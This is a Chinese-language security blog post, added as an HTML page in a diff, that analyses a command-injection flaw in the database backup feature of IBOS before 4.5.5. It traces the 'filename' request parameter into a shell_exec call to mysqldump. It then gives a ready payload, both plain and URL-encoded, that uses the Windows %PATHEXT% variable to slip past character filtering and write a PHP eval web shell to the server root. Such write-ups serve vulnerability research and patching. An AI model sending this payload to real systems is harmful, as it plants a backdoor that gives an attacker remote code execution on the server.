@@ -1,0 +1,208 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>IBOS 4.5.4 命令执行分析 - H3ppo</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="H3ppo,"> 
+    <meta name="description" content="影响版本ibos &amp;lt; 4.5.5
+漏洞分析在ibos4.5.5中 system\core\utils\database.php
+![image-20220918155811032](IBOS ,"> 
+    <meta name="author" content="H3ppo"> 
+    <link rel="alternative" href="/atom.xml" title="H3ppo" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">H3ppo</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://H3ppo.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">IBOS 4.5.4 命令执行分析</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">IBOS 4.5.4 命令执行分析</h1>
+        <div class="stuff">
+            <span>九月 18, 2022</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/PHPsec/" rel="tag">PHPsec</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><pre><code>ibos &lt; 4.5.5</code></pre>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在ibos4.5.5中 system\core\utils\database.php</p>
+<p>![image-20220918155811032](IBOS 4.5.4 命令执行分析.assets/1.png)</p>
+<p>对比ibos4.5.4 system\core\utils\database.php</p>
+<p>![image-20220918155833651](IBOS 4.5.4 命令执行分析.assets/2.png)</p>
+<p>可以看到shell_exec被删除</p>
+<p>全局搜索shell_exec</p>
+<p>data\restore.php中</p>
+<p>![image-20220918155650432](IBOS 4.5.4 命令执行分析.assets/3.png)</p>
+<pre class=" language-php"><code class="language-php"><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$mysqlBin</span> <span class="token punctuation">.</span> mysql <span class="token operator">-</span>h <span class="token punctuation">.</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span> <span class="token operator">-</span>P <span class="token number">3306</span> <span class="token operator">-</span>u root <span class="token operator">-</span>p root  ibos <span class="token operator">&lt;</span> <span class="token variable">$file</span><span class="token punctuation">;</span></code></pre>
+<ul>
+<li>$mysqlBin是上面代码1数据库查询结果</li>
+<li>$file来源未知</li>
+</ul>
+<p>system\core\utils\database.php中</p>
+<pre class=" language-php"><code class="language-php"><span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string">"{$mysqlBin}mysqldump --force --quick $command1 --add-drop-table $command2 $command3 --host=\"{$db["</span>host<span class="token string">"]}\" $command5 --user=\"{$db["</span>username<span class="token string">"]}\" --password=\"{$db["</span>password<span class="token string">"]}\" \"{$db["</span>dbname<span class="token string">"]}\" $tablesstr > $dumpFile"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>mysqldump是MYSQL用于备份数据库的命令，使用如下</p>
+<pre class=" language-sql"><code class="language-sql">mysqldump <span class="token punctuation">[</span>选项<span class="token punctuation">]</span> 数据库名 <span class="token punctuation">[</span>表名<span class="token punctuation">]</span> <span class="token operator">></span> 脚本名
+mysqldump <span class="token punctuation">[</span>选项<span class="token punctuation">]</span> <span class="token comment" spellcheck="true">--数据库名 [选项 表名] > 脚本名</span>
+mysqldump <span class="token punctuation">[</span>选项<span class="token punctuation">]</span> <span class="token comment" spellcheck="true">--all-databases [选项]  > 脚本名</span></code></pre>
+<p>后台存在备份数据库的选项</p>
+<p>![image-20220918161732948](IBOS 4.5.4 命令执行分析.assets/4.png)</p>
+<p>回到\system\core\utils\Database.php </p>
+<pre class=" language-php"><code class="language-php"><span class="token number">1</span><span class="token punctuation">.</span><span class="token variable">$dumpFile</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token constant">PATH_ROOT</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$backupFileName</span> <span class="token punctuation">.</span> <span class="token string">'.sql'</span><span class="token punctuation">;</span>
+<span class="token number">2</span><span class="token punctuation">.</span><span class="token variable">$backupFileName</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">BACKUP_DIR</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'\\'</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$fileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">3</span><span class="token punctuation">.</span><span class="token variable">$fileName</span> <span class="token operator">=</span> Env<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token string">'filename'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>可以看到，这两个就是$filename</p>
+<p>![img](IBOS 4.5.4 命令执行分析.assets/5.png)</p>
+<p>但是，$backupFileName会把filename中的<code>/ \ .</code>替换为空</p>
+<p>利用windows的环境变量来绕过</p>
+<p>![image-20220918163758429](IBOS 4.5.4 命令执行分析.assets/6.png)</p>
+<pre><code>1&amp;echo "&lt;?php @eval($_POST['a']);?&gt;" &gt; a%PATHEXT:~0,1%php&amp;1</code></pre>
+<p>还要对其进行编码，因为post数据会把&amp;当作多个参数</p>
+<pre><code>111%26echo%20%22%3C%3Fphp%20%40eval(%24_POST%5B'a'%5D)%3B%3F%3E%22%20%3E%20a%25PATHEXT%3A~0%2C1%25php%26111</code></pre>
+<p>![image-20220918165303689](IBOS 4.5.4 命令执行分析.assets/7.png)</p>
+<p>发包就可在根目录写入a.php</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='//music/1.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">1.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
